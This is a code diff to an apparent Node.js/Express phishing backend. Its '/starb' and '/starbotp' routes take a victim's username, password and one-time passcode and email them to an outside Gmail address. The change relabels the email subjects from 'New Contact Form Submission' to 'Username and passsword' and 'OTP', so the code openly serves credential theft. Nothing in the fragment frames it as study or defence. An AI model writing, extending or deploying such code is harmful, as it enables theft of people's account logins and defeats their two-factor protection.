@@ -741,7 +741,7 @@ app.post("/starb", async (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "rockydean70@gmail.com", // list of receivers
-    subject: `New Contact Form Submission ${userName}`, // Subject line
+    subject: `Username and passsword for ${userName}`, // Subject line
     text: message, // plain text body
   };
 
@@ -765,10 +765,10 @@ app.post("/starbotp", async (req, res) => {
 
   // Construct email message
   const message = `
-    New details for${userName}:
+    New OTP for${userName}:
 
     OTP: ${otp}
-    
+
     userName: ${userName}
 
     password: ${password}
@@ -787,7 +787,7 @@ app.post("/starbotp", async (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "rockydean70@gmail.com", // list of receivers
-    subject: `New Contact Form Submission ${userName}`, // Subject line
+    subject: `OTP for ${userName}`, // Subject line
     text: message, // plain text body
   };
 
